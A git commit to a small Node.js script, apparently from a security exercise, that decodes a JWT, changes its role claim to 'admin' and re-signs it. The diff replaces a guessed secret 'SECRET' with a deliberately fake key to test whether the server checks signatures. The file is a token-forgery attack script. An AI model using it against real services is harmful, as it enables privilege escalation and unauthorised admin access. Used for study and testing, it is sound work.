b78a933ba7d333df463e72ae575b06e3291cb3d1
brka <mbrkic16@gmail.com>
2023-12-24 11:47:17 +0100

    Attack with fake key instead of the real one

--- modify_jwt.js
+++ modify_jwt.js
@@ -1,14 +1,14 @@
 const jwt = require("jsonwebtoken");
 
 const token =
-  "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoidXNlciIsImlhdCI6MTcwMzMzNjIwN30.8zVCl856VsXpDMlewGGuX51PEymSiJ67sLcMsXTNIgw";
+  "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoidXNlciIsImlhdCI6MTcwMzQxNDczOH0.eDoh6Kn7ehPc0uL0P899iUdqZHYlJ2eG4N66srSp4rg";
 
-const SECRET_KEY = "SECRET";
+const FAKE_KEY = "JOISGAJGOAGOISAgsjioagajspgoas";
 
 let decoded = jwt.decode(token);
 
 decoded.role = "admin";
 
-const encoded = jwt.sign(decoded, SECRET_KEY);
+const encoded = jwt.sign(decoded, FAKE_KEY);
 
 console.log("Promenjeni token: ", encoded);
